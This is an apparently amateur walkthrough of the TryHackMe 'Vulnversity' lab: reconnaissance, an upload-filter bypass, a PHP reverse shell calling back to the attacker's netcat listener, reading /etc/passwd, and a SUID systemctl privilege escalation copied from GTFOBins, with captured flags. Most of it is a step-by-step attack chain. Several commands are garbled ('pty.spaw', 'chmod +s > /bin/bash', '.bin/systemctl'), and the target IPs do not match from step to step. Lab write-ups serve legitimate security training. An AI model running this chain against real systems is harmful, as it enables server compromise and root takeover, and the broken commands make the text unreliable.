                               vulnversity
                           ======================
Learn about active recon, web app attacks and privilege escalation
 
https://tryhackme.com/hacktivities/search
 
https://tryhackme.com/room/vulnversity
 
 
https://github.com/fartaviao/tryhackme-vulnversity/blob/main/Vulnversity.md
    
	walkthrough video (John Hammond)
                       ==============
https://www.youtube.com/watch?v=hvYWCegfEZs&list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&index=3

   
    
   

<IP  >= remote ip =  10.10.121.171

nmap -sV <IP>

Identified open ports:

    21/tcp - FTP (vsftpd 3.0.3)
    22/tcp - SSH (OpenSSH 7.2p2 Ubuntu)
    139, 445/tcp - Samba (SMB service)
    3128/tcp - Squid proxy (3.5.12)
    3333/tcp - Apache HTTP Server (2.4.18 Ubuntu)
	
	you can open the web page in url =  'http://10.10.34.169:3333/'
	
Task 3:    Locating directories using Gobuster
------------------------------
Gobuster is a tool for brute-forcing URIs (directories and files), DNS subdomains, and virtual host names.  

 gobuster dir -u http://IP:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt

What is the directory that has an upload form page?
Try to open all the paths . you will find the uploa page in the next path:
http://IP:3333/internal/


  

-------------------------------------------
Now that you have found a form to upload files, 
( http:<ip>:3333/internal/ )
we can leverage this to upload and execute our payload, which will lead to compromising the web server.

    Answer the questions below:

    What common file type you'd want to upload to exploit the server is blocked? 

    Logically, the ideal would be to upload a .php file to execute code. Imagine it as a Trojan horse.

download file:
     https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
Before we proceed to test the upload form, we’ll need to change the IP address in the php reverse shell script. Set this to your attack machine’s IP address 
 You can also change the port if you’d like; this is a matter of preference. We just need to make sure that our listener is set to the same port so we will change it to  9001, A random port number above 9000


so the lines are :
  $ip = '10.10.231.94';  // CHANGE THIS   local IP not Remote IP
  $port = 9001;         // CHANGE THIS     A random port number above 9000

Next  start up a netcat listener so we will have a shell as soon as the php file is executed. 
Do this in a terminal:

 goto upload dir http://10.10.231.94:3333/internal
  and try to upload 
  the result is 'Extension not allowed'
  
  So this extensio is not allowed


Now we need t5o find wich extensio is allowed:
  To do this, we'll use BurpSuite. We’re going to use Intruder (used to automate custom attacks). To start, make a wordlist with the following extensions:

.php
.php3
.php4
.php5
.phtml

Qustion:
 What extension is allowed after running the above exercise?
answer:
  run the ape.py     (https://github.com/LegendSpam/VulnVersity/blob/main/ape.py)
  
  the answer is   phtml

 goto http://10.10.121.171:3333/internal/index.php
   and try to upload    'revershall.phtml'   and you'll get sucesss .
   

check http://10.10.121.171:3333/internal/uploads
the answer is :
         Index of /internal/uploads
         Name	               Last modified	Size	Description
         Parent Directory	 	- 	 
         revershall.phtml	2025-11-04 09:12 	4.0K	 


  -----------------   Getting a Reverse Shell ==============
We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and execute your shell, which will beacon out to you to control! 

To gain remote access to this machine, follow these steps:

  a.  Opn the revershall.php file and edit the ip to be your local  tun0 ip
         you can find it in the output .  from  sudo ifconfig
  b.  From  http://10.10.187.16:3333/internal/    Upload 'revershall.phtml'
  c.  check that the file is ploaded in http://10.10.239.131:3333/internal/uploads/ 
  d.  We're now going to listen to incoming connections using netcat. 
        Run the following command: nc -lvnp 9001.
  e.  run revershall.phtml'  from the 'internal/uploads/'  dir  
  f.  In the trminal you can run command on the remote host(  ls, whoami)
  g.  In the terminal run : python -c "import pty; pty.spaw('/bin/bash')"
  
 --------------------------------------------- 
  qusetion: What is the name of the user who manages the webserver? and the flag
  a. run cat  etc/passwd
   output list of users 
    one user is :   bill:x:1000:1000:,,,:/home/bill:/bin/bash
  b. cd /home/bill 
     ls
	 output : user.txt
  c. cat 	user.txt 
	 output :   8bd7992fbe8a6ad22a63361004cfcedb

                        task 5:	 Privilege Escalation
===============================================================================	
In Linux, SUID (set owner userId upon execution) is a particular type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, you will need to write to the shadowers file that you do not have access to; root does, so it has root privileges to make the right changes.

let's look at a specific example:
run 
  ls -l /usr/bin/passwd
  output:
     -rwsr-xr-x 1 root root 68208 Feb  6  2024 /usr/bin/passwd
   
    s in the user block indicates that the SUID bit is set.
    The passwd file runs with root privileges even if another user executes it.
   
  cd /home/bill
   
  

    Why is it important?

The SUID bit can be a vector for privilege escalation if misconfigured. In pentesting or security auditing, finding files with active SUID bits is essential to detect potential security flaws.

    Run the command lists all files with the SUID bit enabled on the system.
find / -perm -u=s -type f 2>/dev/null 
     
question:
On the system, search for all SUID files. Which file stands out?
answer:
 
   Run the command to find files with SUID:

find / -perm -u=s -type f 2>/dev/null 
This command lists all files with the SUID bit enabled on the system.
output:
/usr/bin/newuidmap
....
/bin/mount
/bin/umount
/bin/systemctl
/bin/fusermount
....  find / -user root -perm -4000 -exec ls -ldb {} \;
 Which file stands out?
answer: /bin/systemctl


    Why is systemctl with SUID is important and so Dangerous?

During privilege escalation, discovering /bin/systemctl with the SUID bit set is a major finding.

    What is systemctl?

systemctl is the primary tool for managing systemd services. It allows users to:

    Start/stop/restart services

    Enable/disable services at boot

    View system logs and states

    Switch targets (runlevels)

    Reload daemons and configurations

    What Makes systemctl with SUID Special?

Having the SUID bit on systemctl means it runs with root privileges, even if executed by a normal user. This opens multiple paths for privilege escalation:




How to Check if systemctl is SUID?

ls -l /bin/systemctl
output: 
   -rwsr-xr-x 1 root root 996584 Jun 17  2024 /bin/systemctl
The s in rws means it has SUID, which is dangerous.		

What is the root flag value?

goto   GTFOBins (https://gtfobins.github.io/)
This project collects legitimate functions of Unix binaries that can be abused.
look for systemctl. you will find the script:

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s > /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
.bin/systemctl link $TF
.bin/systemctl enable --now $TF

 run it 
 
 run ls -l /bin/bash
 output:
 
 -rwsr-sr-x 1 root root 1037528 may 16 2017  bin/bash
 
 now if we run bash -p we will be root
cd /root
ls
root.txt

cat root.txt 
and you get the flag: a58ff8579f0a9270368d33a9966c7fd5
 	
https://youtu.be/hvYWCegfEZs?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=1282




